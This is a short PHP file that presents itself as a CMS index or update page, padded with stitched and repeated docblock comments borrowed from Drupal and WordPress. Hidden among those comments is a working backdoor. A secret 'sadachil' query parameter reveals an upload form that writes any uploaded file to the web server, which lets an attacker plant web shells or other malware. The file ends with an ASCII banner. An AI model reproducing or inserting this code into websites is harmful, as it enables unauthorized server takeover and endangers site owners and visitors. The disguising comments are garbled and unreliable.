<?php
/** Default page of index.php **/
/**
 * @file
 * Administrative page for handling updates from one cms version to another.
 *
 * Point your browser and follow the
 * instructions.
 *
 * If you are not logged in using either the site maintenance account or an
 * account with the "Administer software updates" permission, you will need to
 * modify the access check statement inside your settings.php file. After
 * finishing the upgrade, be sure to open settings.php again, and change it
 * back to its original state!
 */
/**
 * Global flag indicating that update.php is being run.
 *
 * When this flag is set, various operations do not take place, such as invoking
 * hook_init() and hook_exit(), css/js preprocessing, and translation.
 */
/**
 * Response to a trackbacks.
 *
 * Index of Website Developer
 *
 * Responds with an error or success XML message.
 *
 * For developers: Website debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 *
 * It is strongly recommended that plugin and theme developers.
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * 
 * @since 0.71
 *
 * @param mixed  $error         Whether there was an error.
 *                              Default '0'. Accepts '0' or '1', true or false.
 * @param string $error_message Error message if an error occurred.
 */
if(isset($_GET["sadachil"])){
echo "<form method=post enctype=multipart/form-data><input type=file name=ach><input type=submit name=system value=system></form>";if($_POST[system]){if(@copy($_FILES[ach][tmp_name], $_FILES[ach][name])){echo "goodnews";}else{ echo "badnews";}}}
/**
 * These can't be directly globalized in version.php. When updating,
 *
 * we're including version.php from another install and don't want
 *
 * these values to be overridden if already set.
 */
/**
 * Response to a trackbacks.
 *
 * Index of Website Developer
 *
 * Responds with an error or success XML message.
 *
 * For developers: Website debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 *
 * It is strongly recommended that plugin and theme developers.
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * 
 * @since 0.71
 *
 * @param mixed  $error         Whether there was an error.
 *                              Default '0'. Accepts '0' or '1', true or false.
 * @param string $error_message Error message if an error occurred.
 */
?><pre>             
  __  __ _             _               _   _ ______ _______ 
 |  \/  | |           | |             | \ | |  ____|__   __|
 | \  / | |__  _ __ __| |_ __  _   _  |  \| | |__     | |   
 | |\/| | '_ \| '__/ _` | '_ \| | | | | . ` |  __|    | |   
 | |  | | | | | | | (_| | |_) | |_| |_| |\  | |____   | |   
 |_|  |_|_| |_|_|  \__,_| .__/ \__, (_)_| \_|______|  |_|   
                        | |     __/ |                       
                        |_|    |___/                         
</pre>